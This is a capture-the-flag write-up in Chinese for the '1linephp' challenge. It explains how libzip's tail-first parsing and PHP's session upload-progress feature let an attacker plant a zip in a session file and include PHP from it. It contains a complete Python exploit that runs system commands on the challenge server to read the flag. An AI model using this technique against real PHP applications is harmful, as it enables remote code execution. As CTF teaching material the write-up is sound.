## 1linephp

#### solution

##### zip

php的zip extension使用的是libzip这个库，通过阅读libzip的源码可以发现，其解析zip文件的方式是从后往前的，先在文件末尾的一个范围内寻找EOCD的MAGIC，然后根据EOCD中的offset去读取CDH，最后根据CDH中的offset去读取压缩文件数据。

这种解析方式使得可以在zip的开头和末尾以及各个部分之间插入多余的数据，只需对应地修改两个offset就可以让libzip正常解析。

如果在zip_open时开启了ZIP_CHECKCONS这个选项，那么解析zip时的检查会更严格。

###### 备注

用 *zip* 工具修复offset: https://github.com/perfectblue/ctf-writeups/tree/master/2021/0ctf-2021-quals/onelinephp

在与参赛选手的交流中发现，其实是可以搜到相关的信息的：

- https://gynvael.coldwind.pl/?id=523
- http://roverdoge.top

##### session

PHP_SESSION_UPLOAD_PROGRESS: https://www.php.net/manual/zh/session.upload-progress.php

session.save_path: https://www.php.net/manual/zh/session.configuration.php#ini.session.save-path

利用这个特性可以在文件名可控的session文件中插入一段可控的数据，具体细节已有不少文章分析过，不再赘述。

除了竞争的做法以外，还可以用更稳定的做法。

> 当 [session.upload_progress.enabled](https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled) INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。

只要文件上传得慢一点，就可以让session文件中的上传进度信息保留得久一点，详见exp。

##### CcL's exp

```python
import requests
import socket

port = 50081
php_session_id = "dd9c6236c439f75b78cf6ef8d1efca31"
payload = b"ccl_PK\x03\x04\x14\x00\x00\x00\x08\x00\xe5Q\xd9Rs\xaei\xe7\x1d\x00\x00\x00 \x00\x00\x00\x0b\x00\x1c\x00include.phpUT\t\x00\x03-<\xd5`-<\xd5`ux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00s\xb0\xb1/\xc8(PHM\xce\xc8WP\x89ww\r\x896\x88\xd5\x800\x0cc5\xad\xb9\x00PK\x01\x02\x1e\x03\x14\x00\x00\x00\x08\x00\xe5Q\xd9Rs\xaei\xe7\x1d\x00\x00\x00 \x00\x00\x00\x0b\x00\x18\x00\x00\x00\x00\x00\x01\x00\x00\x00\xa4\x81\x14\x00\x00\x00include.phpUT\x05\x00\x03-<\xd5`ux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00Q\x00\x00\x00v\x00\x00\x00\x00\x00"


def exp():
    res = requests.get(
        f"http://111.186.59.2:{port}/",
        params={
            "yxxx": f"zip:///tmp/sess_{php_session_id}#include",
            "0": "system",
            "1": "cat /dd810fc36330c200a_flag/flag",
        },
    )
    print(res.text)


def build_http_request_packet(req: requests.PreparedRequest):
    packet = b""
    packet += f"{req.method} {req.path_url} HTTP/1.1\r\n".encode()
    for header, value in req.headers.items():
        packet += f"{header}: {value}\r\n".encode()
    packet += b"\r\n"
    if req.body is not None:
        if "Content-Length" in req.headers:
            if type(req.body) is str:
                packet += req.body.encode()
            else:
                packet += req.body
        else:
            for part in req.body:
                packet += f"{len(part):x}\r\n".encode()
                packet += f"{part}\r\n".encode()
            packet += b"0\r\n\r\n"
    return packet


def do_so():
    req = requests.Request(
        "POST",
        f"http://111.186.59.2:{port}/",
        headers={"Host": f"111.186.59.2:{port}"},
        cookies={"PHPSESSID": php_session_id},
        data={
            "PHP_SESSION_UPLOAD_PROGRESS": payload,
        },
        files={"file": ("simple.txt", b"ccl" * 4096)},
    )
    packet = build_http_request_packet(req.prepare())
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("111.186.59.2", port))
    s.sendall(packet[:-8])
    exp()
    s.sendall(packet[-8:])
    s.close()


if __name__ == "__main__":
    do_so()
```

#### unintended solution

把zip文件的前16个字节删除后作为payload即可。

预期解中session文件的内容为16字节prefix+修改offset后的zip+suffix。

非预期解中session文件的内容为16字节prefix+去除前16个字节后的zip+suffix。

##### why?

通过阅读libzip的源码可以发现，其在读取zip内的文件时，先根据CDH中的offset找到LFH的位置，然后在LFH块中并没有解析全部内容，而是直接根据相对位置读取file name length和extra field length，用这两个值的和再加上30作为压缩数据的offset，直接读取压缩数据。

因此，在本题中，文件的前16个字节对libzip没有任何意义，可以任意修改。
